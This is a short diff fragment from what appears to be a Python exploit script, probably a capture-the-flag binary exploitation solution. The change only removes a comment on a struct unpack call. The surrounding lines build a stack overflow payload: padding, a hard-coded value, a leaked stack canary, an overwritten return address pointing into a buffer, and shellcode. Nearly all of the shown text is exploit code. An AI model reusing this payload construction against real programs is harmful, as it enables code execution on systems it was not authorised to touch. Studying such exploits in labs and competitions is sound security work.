@@ -28,7 +28,7 @@ PADDING = b'A'*(72-len(SHELLCODE))
 
 buff_addr = u64(buff_addr) + 0x50
 buff_addr = p64(buff_addr)
-addr = struct.unpack('<Q', buff_addr[:8])[0]  # '<Q' = unsigned long long, 8 byte, little endian
+addr = struct.unpack('<Q', buff_addr[:8])[0]
 
 print(hex(addr)) 
 payload = b'A' * 40 + b"\x5c\x29\x9b\x52\x89\x21\x29\x24" + b'A' * 8 + cana + b'A' * 8 + buff_addr + SHELLCODE
